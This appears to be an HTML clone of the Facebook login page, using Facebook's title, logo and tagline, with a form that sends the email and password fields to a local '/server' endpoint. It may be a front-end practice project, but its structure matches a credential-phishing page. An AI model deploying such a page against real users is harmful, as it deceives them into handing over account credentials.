<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link rel="stylesheet" href="facebook.css">
</head>
<body>
    <div id="total">
        <section>
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook">
            <p>Facebook helps you connect and share with the people in your life.</p>
        </section>
        <div id="form" class="all">
            <form action="/server">
                <div class="input">
                    <input type="email" id="email"class="all"  name="mailId" placeholder="Email address or phone number"> 
                </div>
                <div class="input">
                    <input type="password" id="password" class="all" name="pass" placeholder="Password">
                </div>
                <div id="login">
                    <button id="log" class="all">Log in</button>
                </div>
                <div id="forgot">
                    <a href="/server1">Forgotten password?</a>
                </div>
                <div id="line"></div>
                <div id="create">
                    <button id="createbut" class="all" type="button">Create new account</button>
                </div>
            </form>
        </div>
        <div id="last">
            <b>Create a Page</b> for a celebrity, brand or business.
        </div>
    </div>
</body>
</html>
